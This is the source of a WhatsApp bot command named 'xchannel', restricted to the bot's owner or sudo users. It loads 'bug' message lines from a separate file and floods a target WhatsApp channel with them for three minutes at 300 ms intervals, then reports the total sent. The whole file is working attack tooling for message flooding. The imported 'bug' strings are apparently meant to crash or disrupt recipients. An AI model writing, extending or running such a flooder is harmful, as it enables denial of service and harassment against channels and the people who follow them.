const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka5.js'); // ✅ verifye path la kòrèk

cmd({
  pattern: 'xchannel',
  desc: 'Send bug messages to WhatsApp Channel',
  category: 'bug',
  react: '📢',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowed = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(x => x + '@s.whatsapp.net')
    ];

    if (!allowed.includes(senderId)) {
      return await bot.sendMessage(from, {
        text: '*🚫 Owner or sudo only.*'
      }, { quoted: mek });
    }

    const args = m.body.trim().split(/\s+/).slice(1);
    const channelId = args[0];

    if (!channelId || !channelId.endsWith('@newsletter')) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}xchannel 1203xxxxx@newsletter`
      }, { quoted: mek });
    }

    const bugLines = bugchat.split('\n').filter(Boolean);
    const startTime = Date.now();
    let count = 0;

    // Optional: 2-3 minutes flood (change below)
    while (Date.now() - startTime < 3 * 60 * 1000) {
      for (let line of bugLines) {
        await bot.sendMessage(channelId, {
          text: `📢 *IZUKA-X CHANNEL BUG*\n${line}\n\n~XDAWENS SYSTEM~`
        }).catch(e => console.error('❌ Fail:', e));
        count++;
        await new Promise(r => setTimeout(r, 300));
      }
    }

    await bot.sendMessage(from, {
      text: `✅ Bug messages sent to channel: ${channelId}\n🧨 Total Sent: ${count}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
